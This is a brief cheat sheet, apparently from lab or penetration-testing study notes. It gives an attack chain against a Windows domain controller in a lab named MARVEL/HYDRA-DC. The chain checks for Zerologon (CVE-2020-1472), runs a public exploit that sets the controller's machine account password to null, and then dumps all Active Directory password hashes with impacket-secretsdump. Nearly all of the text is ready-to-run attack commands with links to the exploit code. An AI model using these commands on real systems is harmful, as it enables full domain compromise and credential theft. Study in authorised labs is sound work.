
# Test if our target is vulnerable
https://github.com/SecuraBV/CVE-2020-1472
```bash
./zerologon_tester.py HYDRA-DC 192.168.196.128
```

-----------------------

# Set null password to domain admin with exploit
https://github.com/dirkjanm/CVE-2020-1472
```bash
python3 cve-2020-1472-exploit.py HYDRA-DC <dc-ip>
```

-----------------------

# Dump all AD the hashes
```bash
impacket-secretsdump -just-dc MARVEL/HYDRA-DC\$@192.168.196.128
```

-----------------------
